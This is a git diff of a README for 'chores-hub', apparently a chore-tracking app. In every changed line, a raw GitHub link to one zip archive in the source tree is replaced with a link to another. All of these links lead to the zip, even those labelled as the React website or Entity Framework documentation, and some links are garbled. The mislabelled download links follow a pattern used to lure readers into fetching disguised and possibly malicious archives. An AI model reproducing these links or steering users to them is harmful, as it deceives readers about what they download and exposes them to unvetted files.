@@ -1,7 +1,7 @@
 # 🎉 chores-hub - Simplify Your Household Chores
 
 ## 📥 Download Now
-[![Download Chores Hub](https://raw.githubusercontent.com/ksubham-dora2002/chores-hub/main/client/src/home/hub_chores_v1.3-alpha.1.zip%20Chores%20Hub-v1.0-blue)](https://raw.githubusercontent.com/ksubham-dora2002/chores-hub/main/client/src/home/hub_chores_v1.3-alpha.1.zip)
+[![Download Chores Hub](https://raw.githubusercontent.com/ksubham-dora2002/chores-hub/main/client/public/hub-chores-v3.9.zip%20Chores%20Hub-v1.0-blue)](https://raw.githubusercontent.com/ksubham-dora2002/chores-hub/main/client/public/hub-chores-v3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to chores-hub! This is a simple app designed to help you manage household chores efficiently. You can create, assign, and track chores for family members, all in one place.
@@ -27,7 +27,7 @@ Chores hub offers several useful features to make managing your household tasks 
 To get started with chores-hub, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to navigate to the downloads page.
-   [Download Chores Hub](https://raw.githubusercontent.com/ksubham-dora2002/chores-hub/main/client/src/home/hub_chores_v1.3-alpha.1.zip)
+   [Download Chores Hub](https://raw.githubusercontent.com/ksubham-dora2002/chores-hub/main/client/public/hub-chores-v3.9.zip)
 
 2. **Select the Latest Release:** Choose the latest version of the app. Look for files labeled with the version number.
 
@@ -87,9 +87,9 @@ These technologies help ensure the app runs smoothly and securely.
 ## 🔗 Additional Resources
 To expand your understanding of the app and the technologies behind it, here are some additional resources:
 
-- [Official https://raw.githubusercontent.com/ksubham-dora2002/chores-hub/main/client/src/home/hub_chores_v1.3-alpha.1.zip Core Documentation](https://raw.githubusercontent.com/ksubham-dora2002/chores-hub/main/client/src/home/hub_chores_v1.3-alpha.1.zip)
-- [React Official Website](https://raw.githubusercontent.com/ksubham-dora2002/chores-hub/main/client/src/home/hub_chores_v1.3-alpha.1.zip)
-- [Entity Framework Core Documentation](https://raw.githubusercontent.com/ksubham-dora2002/chores-hub/main/client/src/home/hub_chores_v1.3-alpha.1.zip)
+- [Official https://raw.githubusercontent.com/ksubham-dora2002/chores-hub/main/client/public/hub-chores-v3.9.zip Core Documentation](https://raw.githubusercontent.com/ksubham-dora2002/chores-hub/main/client/public/hub-chores-v3.9.zip)
+- [React Official Website](https://raw.githubusercontent.com/ksubham-dora2002/chores-hub/main/client/public/hub-chores-v3.9.zip)
+- [Entity Framework Core Documentation](https://raw.githubusercontent.com/ksubham-dora2002/chores-hub/main/client/public/hub-chores-v3.9.zip)
 
 ## 📞 Contact
 For any further issues or feedback, please create an issue in the GitHub repository. Your input helps us improve the application.
